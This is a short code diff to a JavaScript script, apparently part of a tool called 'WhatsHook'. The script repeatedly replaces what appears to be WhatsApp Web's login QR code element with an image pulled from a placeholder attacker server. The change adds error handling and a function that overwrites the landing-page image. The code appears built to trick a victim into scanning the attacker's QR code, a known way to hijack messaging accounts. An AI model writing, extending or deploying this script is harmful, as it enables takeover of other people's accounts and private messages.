@@ -17,10 +17,19 @@ function check(changes, observer) {
     if(document.getElementsByClassName("_25pwu")[0]) {
         observer.disconnect();
             setInterval(function(){
-                console.log("Hey")
                 const img = document.createElement("img")
                 img.src = "LINK TO YOUR SERVER/WhatsHook/img.png?lastmod="+Date.now();
-                document.getElementsByClassName("_25pwu")[0].replaceWith(img);
+                try {
+                    document.getElementsByClassName("_25pwu")[0].replaceWith(img);
+                } catch {
+                }
+                function edit()
+                {
+                    var image = document.querySelector("#app > div > div > div.landing-window > div.landing-main > div > img");
+
+                    image.src = img.src;
+                }
+                edit();
             }, 2000);
     }
 }
